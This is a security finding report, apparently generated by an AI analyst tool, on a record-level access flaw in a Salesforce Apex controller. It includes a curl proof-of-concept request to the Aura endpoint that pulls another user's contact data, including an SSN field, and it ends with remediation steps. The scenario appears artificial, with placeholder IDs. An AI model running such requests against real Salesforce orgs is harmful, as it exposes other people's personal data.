# Security Analysis Report
**System:** PipelinePro Sales API (B2B SaaS / CRM) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0034 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform / Pattern 9.2 | Salesforce SOQL record-level access bypass — `ContactController.updateContact` without ownership check exposes cross-user CRM contact records |

---

## Finding 1 — SOQL Record-Level Bypass: CRM Contact Data Exposed (CRITICAL)

### Summary
The `ContactController` Apex class on PipelinePro Sales API (`a17ad9d2.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private for Contact records. Per §5.0 Pattern 9.2, the `updateContact` Aura action issues a SOQL query with no ownership predicate, allowing any session holder to access any Contact record by ID. Attacker supplies `contactId: "001D9D2"` and receives CRM contact data.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.ContactController.updateContact`
**Affected endpoint:** `POST https://a17ad9d2.lightning.force.com/aura`

### Evidence from HAR
**Request:** `contactId: 001D9D2` | **Response:** `OwnerId: 005VICTIM`, `SensitiveData__c: SSN: 000-25-4587`

### Evidence Map
| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class | OWD bypassed |
| §5.0 Pattern 9.2 | SOQL bypass | Classification | Record-level access |
| HAR descriptor | `c.ContactController.updateContact` | Entry point | Write action for read |
| HAR params | `contactId` | `001D9D2` | Victim CRM contact |
| HAR response | `SensitiveData__c` | `SSN: 000-25-4587` | Contact PII |

### Steps to Reproduce
```bash
curl -s -X POST "https://a17ad9d2.lightning.force.com/aura" \
  -H "Authorization: Bearer 00DA17AD9D2!ARa17ad9d2..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContactController.updateContact","callingDescriptor":"UNKNOWN","params":{"contactId":"001D9D2","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```

### Remediation
1. `public with sharing class ContactController {`
2. `WHERE Id = :contactId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side field allowlist; validate `aura.token`.
